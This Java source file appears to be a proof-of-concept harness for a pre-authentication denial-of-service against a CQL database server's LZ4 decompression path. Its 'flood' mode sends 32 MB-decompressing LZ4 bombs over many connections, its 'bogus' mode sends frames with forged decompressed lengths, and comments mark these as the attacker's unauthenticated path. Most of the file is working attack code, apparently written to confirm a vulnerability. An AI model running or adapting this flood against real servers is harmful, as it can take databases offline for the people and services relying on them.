// B19 3-b confirm (ms0625, 2026-11-23): stage-2 B19Client with authentication-aware STARTUP.
//   * handshake(): a server with PasswordAuthenticator answers STARTUP with AUTHENTICATE (opcode 0x03). With -Duser/-Dpass
//     set, the client answers with AUTH_RESPONSE (SASL PLAIN) and expects AUTH_SUCCESS; without them (the attacker: no
//     credentials, pre-auth) it leaves AUTHENTICATE unanswered and goes on with the socket (prints HANDSHAKE ... lines).
//   * new mode authcheck: claim checks that authentication is enforced and that the LZ4 path is reached pre-auth.
// Stage-2 header:
// B19 raw-socket CQL protocol-v4 client (no driver). Java 11 single-file launch:
//   java -cp $BUILD/lib/lz4-java-1.10.1.jar B19Client.java <mode> ...   (host 127.0.0.19:9042, -Dhost= to change)
// Modes:
//   schema                      uncompressed CREATE KEYSPACE b19 / CREATE TABLE b19.t (k int PRIMARY KEY, v int)
//   load <rows>                 uncompressed INSERTs k=v=i, 4 connections x 256 outstanding
//   probe                       one uncompressed SELECT count(*) FROM b19.t (page_size 5000): latency + count
//   flood <kind> <E> <Q> <secs> kind = zero | rand | "bogus <L>". E LZ4 connections (STARTUP COMPRESSION=lz4), each
//                               keeping up to Q requests outstanding. Body built and compressed once, reused.
//                               zero: QUERY + zero padding to D=33554432 bytes; rand: QUERY + random padding, total
//                               length chosen so the compressed length is within 1% of zero's.
//                               bogus <L>: one connection sends 13-byte bodies (L + 9 zero bytes), -Dreps=N frames,
//                               a fresh connection each, -Dgapms=200 apart; reads one response or EOF <= 30 s each.
// Output: FLOOD_START <epoch_ms>, 1-s STAT lines, FINAL.
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import net.jpountz.lz4.*;

public class B19AuthClient {
    static final String HOST = System.getProperty("host", "127.0.0.19");
    static final int PORT = 9042;
    static final int D = Integer.getInteger("D", 33554432);
    static final String QUERY = "SELECT count(*) FROM b19.t";
    static final LZ4Factory F = LZ4Factory.fastestInstance();

    static long now() { return System.currentTimeMillis(); }

    static byte[] frame(int flags, int stream, int opcode, byte[] body) {
        byte[] f = new byte[9 + body.length];
        f[0] = 4; f[1] = (byte) flags; f[2] = (byte) (stream >> 8); f[3] = (byte) stream; f[4] = (byte) opcode;
        int L = body.length; f[5] = (byte) (L >>> 24); f[6] = (byte) (L >>> 16); f[7] = (byte) (L >>> 8); f[8] = (byte) L;
        System.arraycopy(body, 0, f, 9, L);
        return f;
    }

    static byte[] startupBody(boolean lz4) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream(); DataOutputStream o = new DataOutputStream(b);
        o.writeShort(lz4 ? 2 : 1);
        wstr(o, "CQL_VERSION"); wstr(o, "3.0.0");
        if (lz4) { wstr(o, "COMPRESSION"); wstr(o, "lz4"); }
        return b.toByteArray();
    }
    static void wstr(DataOutputStream o, String s) throws IOException { byte[] x = s.getBytes(StandardCharsets.UTF_8); o.writeShort(x.length); o.write(x); }

    // QUERY body: [long string query][short consistency][byte flags][int page_size if flags&0x04]
    static byte[] queryBody(String q, boolean paged) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream(); DataOutputStream o = new DataOutputStream(b);
        byte[] x = q.getBytes(StandardCharsets.UTF_8); o.writeInt(x.length); o.write(x);
        o.writeShort(0x0001); // ONE
        if (paged) { o.writeByte(0x04); o.writeInt(5000); } else o.writeByte(0);
        return b.toByteArray();
    }

    static byte[] lz4(byte[] raw) {
        LZ4Compressor c = F.fastCompressor();
        byte[] out = new byte[4 + c.maxCompressedLength(raw.length)];
        out[0] = (byte) (raw.length >>> 24); out[1] = (byte) (raw.length >>> 16); out[2] = (byte) (raw.length >>> 8); out[3] = (byte) raw.length;
        int w = c.compress(raw, 0, raw.length, out, 4, out.length - 4);
        return Arrays.copyOf(out, 4 + w);
    }

    static class Resp { int flags, stream, opcode; byte[] body; boolean warned; }
    static Resp read(DataInputStream in) throws IOException {
        byte[] h = new byte[9]; in.readFully(h);
        Resp r = new Resp(); r.flags = h[1] & 0xFF; r.stream = (short) (((h[2] & 0xFF) << 8) | (h[3] & 0xFF)); r.opcode = h[4] & 0xFF;
        int L = ((h[5] & 0xFF) << 24) | ((h[6] & 0xFF) << 16) | ((h[7] & 0xFF) << 8) | (h[8] & 0xFF);
        byte[] b = new byte[L]; in.readFully(b);
        if ((r.flags & 1) != 0 && L >= 4) {
            int u = ((b[0] & 0xFF) << 24) | ((b[1] & 0xFF) << 16) | ((b[2] & 0xFF) << 8) | (b[3] & 0xFF);
            byte[] o = new byte[u]; F.fastDecompressor().decompress(b, 4, o, 0, u); b = o;
        }
        if ((r.flags & 0x08) != 0 && b.length >= 2) { // warnings: [string list] before the body (harness fix 08:47)
            int n = ((b[0] & 0xFF) << 8) | (b[1] & 0xFF), o = 2;
            for (int i = 0; i < n && o + 2 <= b.length; i++) o += 2 + (((b[o] & 0xFF) << 8) | (b[o + 1] & 0xFF));
            r.warned = true; b = Arrays.copyOfRange(b, Math.min(o, b.length), b.length);
        }
        r.body = b; return r;
    }
    static int errCode(Resp r) { return r.body.length >= 4 ? ((r.body[0] & 0xFF) << 24) | ((r.body[1] & 0xFF) << 16) | ((r.body[2] & 0xFF) << 8) | (r.body[3] & 0xFF) : -1; }
    static String errMsg(Resp r) {
        if (r.body.length < 6) return "";
        int n = ((r.body[4] & 0xFF) << 8) | (r.body[5] & 0xFF);
        return new String(r.body, 6, Math.min(n, r.body.length - 6), StandardCharsets.UTF_8);
    }
    static long rowsCount(Resp r) { // count(*) result: the last 8 bytes of a ROWS body
        int n = r.body.length; if (n < 12) return -1;
        long v = 0; for (int i = n - 8; i < n; i++) v = (v << 8) | (r.body[i] & 0xFF); return v;
    }

    static Socket open() throws IOException {
        Socket s = new Socket(); s.setTcpNoDelay(true); s.setReceiveBufferSize(1 << 20); s.setSendBufferSize(1 << 20);
        s.connect(new InetSocketAddress(HOST, PORT), 10000); return s;
    }
    static final String USER = System.getProperty("user"), PASS = System.getProperty("pass");
    static Socket handshake(boolean lz4) throws IOException { return handshake(lz4, USER, PASS, true); }
    static Socket handshake(boolean lz4, String user, String pass, boolean verbose) throws IOException {
        Socket s = open(); s.setSoTimeout(30000);
        OutputStream out = s.getOutputStream(); DataInputStream in = new DataInputStream(new BufferedInputStream(s.getInputStream(), 1 << 16));
        out.write(frame(0, 0, 0x01, startupBody(lz4))); out.flush();
        Resp r = read(in);
        if (r.opcode == 0x02) { if (verbose) System.out.println("HANDSHAKE lz4=" + lz4 + " STARTUP -> READY (no authentication required)"); return s; }
        if (r.opcode != 0x03) throw new IOException("STARTUP reply opcode " + r.opcode + " " + errMsg(r));
        String cls = r.body.length >= 2 ? new String(r.body, 2, Math.min(((r.body[0] & 0xFF) << 8) | (r.body[1] & 0xFF), r.body.length - 2), StandardCharsets.UTF_8) : "";
        if (user == null) { if (verbose) System.out.println("HANDSHAKE lz4=" + lz4 + " STARTUP -> AUTHENTICATE " + cls + " (left unanswered: no credentials)"); return s; }
        byte[] t = ("\0" + user + "\0" + pass).getBytes(StandardCharsets.UTF_8);
        ByteArrayOutputStream b = new ByteArrayOutputStream(); DataOutputStream o = new DataOutputStream(b); o.writeInt(t.length); o.write(t);
        out.write(frame(0, 0, 0x0F, b.toByteArray())); out.flush();
        Resp a = read(in);
        if (a.opcode != 0x10) throw new IOException("AUTH_RESPONSE reply opcode " + a.opcode + " code=0x" + Integer.toHexString(errCode(a)) + " " + errMsg(a));
        if (verbose) System.out.println("HANDSHAKE lz4=" + lz4 + " STARTUP -> AUTHENTICATE " + cls + " -> AUTH_SUCCESS as " + user);
        return s;
    }

    static Resp sync(Socket s, byte[] f) throws IOException {
        s.getOutputStream().write(f); s.getOutputStream().flush();
        return read(new DataInputStream(new BufferedInputStream(s.getInputStream(), 1 << 16)));
    }

    public static void main(String[] a) throws Exception {
        switch (a[0]) {
            case "schema": schema(); break;
            case "load": load(Integer.parseInt(a[1])); break;
            case "probe": probe(); break;
            case "flood": flood(a); break;
            case "authcheck": authcheck(); break;
            default: System.err.println("bad mode"); System.exit(2);
        }
        System.exit(0);
    }

    static void schema() throws Exception {
        try (Socket s = handshake(false)) {
            for (String q : new String[]{
                    "CREATE KEYSPACE IF NOT EXISTS b19 WITH replication = {'class':'SimpleStrategy','replication_factor':1}",
                    "CREATE TABLE IF NOT EXISTS b19.t (k int PRIMARY KEY, v int)"}) {
                Resp r = sync(s, frame(0, 1, 0x07, queryBody(q, false)));
                System.out.println("schema op=" + r.opcode + (r.opcode == 0 ? " err=" + errMsg(r) : " ok"));
            }
        }
    }

    static void load(int rows) throws Exception {
        final int C = 4, Q = 256; AtomicInteger next = new AtomicInteger(); AtomicLong ok = new AtomicLong(), err = new AtomicLong();
        long t0 = now(); List<Thread> ts = new ArrayList<>();
        for (int c = 0; c < C; c++) {
            Socket s = handshake(false); s.setSoTimeout(60000);
            OutputStream out = new BufferedOutputStream(s.getOutputStream(), 1 << 16);
            DataInputStream in = new DataInputStream(new BufferedInputStream(s.getInputStream(), 1 << 16));
            Semaphore sem = new Semaphore(Q); ArrayBlockingQueue<Integer> ids = new ArrayBlockingQueue<>(Q);
            for (int i = 0; i < Q; i++) ids.add(i);
            AtomicBoolean done = new AtomicBoolean();
            Thread rd = new Thread(() -> {
                try { while (true) { Resp r = read(in); if (r.opcode == 0) { if (err.incrementAndGet() < 5) System.out.println("ERR " + errMsg(r)); } else ok.incrementAndGet(); ids.add(r.stream); sem.release(); } }
                catch (IOException e) { if (!done.get()) System.out.println("reader " + e); }
            });
            Thread wr = new Thread(() -> {
                try {
                    int i;
                    while ((i = next.getAndIncrement()) < rows) {
                        sem.acquire(); int id = ids.take();
                        synchronized (out) { out.write(frame(0, id, 0x07, queryBody("INSERT INTO b19.t (k, v) VALUES (" + i + ", " + i + ")", false))); if (sem.availablePermits() == 0) out.flush(); }
                    }
                    synchronized (out) { out.flush(); }
                    sem.acquire(Q); done.set(true); s.close();
                } catch (Exception e) { System.out.println("writer " + e); }
            });
            rd.setDaemon(true); rd.start(); wr.start(); ts.add(wr);
            // periodic flush helper
            Thread fl = new Thread(() -> { try { while (!done.get()) { Thread.sleep(5); synchronized (out) { out.flush(); } } } catch (Exception e) { } });
            fl.setDaemon(true); fl.start();
        }
        for (Thread t : ts) t.join();
        System.out.println("LOAD rows=" + rows + " ok=" + ok + " err=" + err + " ms=" + (now() - t0));
    }

    static void probe() throws Exception {
        try (Socket s = handshake(false)) {
            s.setSoTimeout(60000);
            long t = now(); Resp r = sync(s, frame(0, 1, 0x07, queryBody(QUERY, true)));
            long dt = now() - t;
            if (r.opcode == 0x08) System.out.println("PROBE ms=" + dt + " count=" + rowsCount(r));
            else System.out.println("PROBE ms=" + dt + " opcode=" + r.opcode + " code=0x" + Integer.toHexString(errCode(r)) + " " + errMsg(r));
        }
    }

    // ---- flood ----
    static final AtomicLong WARNED = new AtomicLong(), SENT = new AtomicLong(), ROWS = new AtomicLong(), BADCOUNT = new AtomicLong(), OUT = new AtomicLong();
    static final ConcurrentHashMap<String, AtomicLong> ERRS = new ConcurrentHashMap<>();
    static final ConcurrentHashMap<String, String> ERRMSG = new ConcurrentHashMap<>();
    static volatile boolean STOP = false; static final AtomicInteger DEAD = new AtomicInteger();
    static volatile String LASTEXC = "";

    static void flood(String[] a) throws Exception {
        String kind = a[1]; int ai = 2; long L = 0;
        if (kind.startsWith("bogus")) {
            String[] k = kind.split(" ");
            if (k.length > 1) L = Long.parseLong(k[1]); else { L = Long.parseLong(a[2]); ai = 3; }
            kind = "bogus";
        }
        if (kind.equals("bogus")) { bogus(L); return; }
        int E = Integer.parseInt(a[ai]), Q = Integer.parseInt(a[ai + 1]); long secs = Long.parseLong(a[ai + 2]);
        byte[] q = queryBody(QUERY, true);
        byte[] zeroRaw = new byte[D]; System.arraycopy(q, 0, zeroRaw, 0, q.length);
        byte[] zc = lz4(zeroRaw);
        byte[] body = zc; int raw = D;
        if (kind.equals("rand")) {
            Random rnd = new Random(19);
            int target = zc.length, len = target; byte[] rc = null;
            for (int it = 0; it < 20; it++) {
                byte[] rr = new byte[len]; rnd.setSeed(19); rnd.nextBytes(rr); System.arraycopy(q, 0, rr, 0, q.length);
                rc = lz4(rr); raw = len;
                if (Math.abs(rc.length - target) <= target / 100 && Math.abs(rc.length - target) < 64) break;
                len += target - rc.length;
            }
            body = rc;
        }
        zeroRaw = null;
        System.out.println("BODY kind=" + kind + " D_decompressed=" + raw + " c_compressed_body=" + body.length + " zero_c=" + zc.length + " frame=" + (body.length + 9) + " ratio=" + String.format("%.1f", raw / (double) body.length));
        final byte[] fbody = body;
        List<Socket> socks = new ArrayList<>();
        for (int e = 0; e < E; e++) socks.add(handshake(true));
        long t0 = now(); System.out.println("FLOOD_START " + t0 + " E=" + E + " Q=" + Q + " secs=" + secs);
        for (Socket s : socks) {
            s.setSoTimeout(0);
            OutputStream out = s.getOutputStream(); DataInputStream in = new DataInputStream(new BufferedInputStream(s.getInputStream(), 1 << 16));
            Semaphore sem = new Semaphore(Q); ArrayBlockingQueue<Integer> ids = new ArrayBlockingQueue<>(Q);
            for (int i = 0; i < Q; i++) ids.add(i);
            Thread rd = new Thread(() -> {
                try {
                    while (true) {
                        Resp r = read(in);
                        if (r.warned) WARNED.incrementAndGet();
                        if (r.opcode == 0x08) { ROWS.incrementAndGet(); long c = rowsCount(r); if (c <= 0) BADCOUNT.incrementAndGet(); }
                        else { String k = r.opcode == 0 ? "0x" + Integer.toHexString(errCode(r)) : "op" + r.opcode; ERRS.computeIfAbsent(k, x -> new AtomicLong()).incrementAndGet(); if (r.opcode == 0) ERRMSG.putIfAbsent(k, errMsg(r)); }
                        OUT.decrementAndGet(); ids.add(r.stream); sem.release();
                    }
                } catch (Exception e) { if (!STOP) { DEAD.incrementAndGet(); LASTEXC = "reader " + e; } }
            });
            Thread wr = new Thread(() -> {
                try {
                    while (!STOP) {
                        if (!sem.tryAcquire(200, TimeUnit.MILLISECONDS)) continue;
                        int id = ids.take();
                        out.write(frame(0x01, id, 0x07, fbody)); out.flush();
                        SENT.incrementAndGet(); OUT.incrementAndGet();
                    }
                } catch (Exception e) { if (!STOP) { DEAD.incrementAndGet(); LASTEXC = "writer " + e; } }
            });
            rd.setDaemon(true); wr.setDaemon(true); rd.start(); wr.start();
        }
        long lastSent = 0;
        for (int sec = 1; sec <= secs; sec++) {
            long target = t0 + sec * 1000L; long sl = target - now(); if (sl > 0) Thread.sleep(sl);
            long s = SENT.get();
            System.out.println("STAT t=" + sec + " ms=" + now() + " sent=" + s + " dsent=" + (s - lastSent) + " rows=" + ROWS.get() + " out=" + OUT.get() + " errs=" + ERRS + " warned=" + WARNED.get() + " dead=" + DEAD.get() + (LASTEXC.isEmpty() ? "" : " last=" + LASTEXC));
            lastSent = s;
            if (DEAD.get() >= 2 * E) { System.out.println("ALL_DEAD t=" + sec + " ms=" + now()); break; }
        }
        STOP = true;
        System.out.println("FINAL ms=" + now() + " sent=" + SENT.get() + " rows=" + ROWS.get() + " badcount=" + BADCOUNT.get() + " out=" + OUT.get() + " errs=" + ERRS + " warned=" + WARNED.get() + " errmsg=" + ERRMSG + " dead=" + DEAD.get() + " last=" + LASTEXC);
        for (Socket s : socks) try { s.close(); } catch (Exception e) { }
    }

    static String describe(Resp r) {
        if (r.opcode == 0) return "ERROR code=0x" + Integer.toHexString(errCode(r)) + " " + errMsg(r);
        if (r.opcode == 0x08) return "RESULT (opcode 8) body=" + r.body.length + "B";
        return "opcode " + r.opcode;
    }
    static String tryq(Socket s, int flags, byte[] body) {
        try { return describe(sync(s, frame(flags, 1, 0x07, body))); }
        catch (EOFException e) { return "EOF (connection closed)"; }
        catch (IOException e) { return "IOEXC " + e.getMessage(); }
    }
    // Claim checks (auth on): (1) plain STARTUP -> AUTHENTICATE; a QUERY before login is refused; (2) a wrong password is
    // refused; (3) LZ4 STARTUP -> AUTHENTICATE, and a valid small LZ4-compressed QUERY before login is decompressed by the
    // pipeline (the frame is parsed) and then refused; (4) with -Duser/-Dpass: login and a SELECT on the given table.
    static void authcheck() throws Exception {
        String sel = System.getProperty("q", "SELECT k FROM vic.kv LIMIT 1");
        try (Socket s = handshake(false, null, null, true)) { s.setSoTimeout(10000);
            System.out.println("CHECK1 plain, no login, QUERY [" + sel + "] -> " + tryq(s, 0, queryBody(sel, false))); }
        try { Socket s = handshake(false, "tenant", "wrong-password", true); System.out.println("CHECK2 wrong password -> ACCEPTED (unexpected)"); s.close(); }
        catch (IOException e) { System.out.println("CHECK2 wrong password -> " + e.getMessage()); }
        try (Socket s = handshake(true, null, null, true)) { s.setSoTimeout(10000);
            System.out.println("CHECK3 lz4, no login, LZ4-compressed QUERY [" + sel + "] -> " + tryq(s, 0x01, lz4(queryBody(sel, false)))); }
        if (USER != null) try (Socket s = handshake(false, USER, PASS, true)) { s.setSoTimeout(10000);
            System.out.println("CHECK4 login as " + USER + ", QUERY [" + sel + "] -> " + tryq(s, 0, queryBody(sel, false))); }
    }

    static void bogus(long L) throws Exception {
        int reps = Integer.getInteger("reps", 1); long gap = Long.getLong("gapms", 200);
        byte[] b = new byte[13];
        b[0] = (byte) (L >>> 24); b[1] = (byte) (L >>> 16); b[2] = (byte) (L >>> 8); b[3] = (byte) L;
        System.out.println("BODY kind=bogus L=" + L + " body=13 frame=22 reps=" + reps);
        long t0 = now(); System.out.println("FLOOD_START " + t0);
        Map<String, Integer> out = new TreeMap<>();
        for (int i = 0; i < reps; i++) {
            String res;
            try (Socket s = handshake(true)) {
                s.setSoTimeout(30000);
                long t = now();
                try {
                    Resp r = sync(s, frame(0x01, 1, 0x07, b));
                    res = r.opcode == 0 ? "ERROR 0x" + Integer.toHexString(errCode(r)) + " " + errMsg(r) : "opcode " + r.opcode;
                } catch (EOFException e) { res = "EOF"; }
                catch (SocketTimeoutException e) { res = "TIMEOUT30s"; }
                catch (IOException e) { res = "IOEXC " + e.getMessage(); }
                System.out.println("BOGUS i=" + i + " ms=" + now() + " dt=" + (now() - t) + " -> " + res);
            } catch (IOException e) { res = "CONNECT_FAIL " + e.getMessage(); System.out.println("BOGUS i=" + i + " ms=" + now() + " -> " + res); }
            out.merge(res.length() > 60 ? res.substring(0, 60) : res, 1, Integer::sum);
            if (i + 1 < reps) Thread.sleep(gap);
        }
        System.out.println("FINAL ms=" + now() + " results=" + out);
    }
}
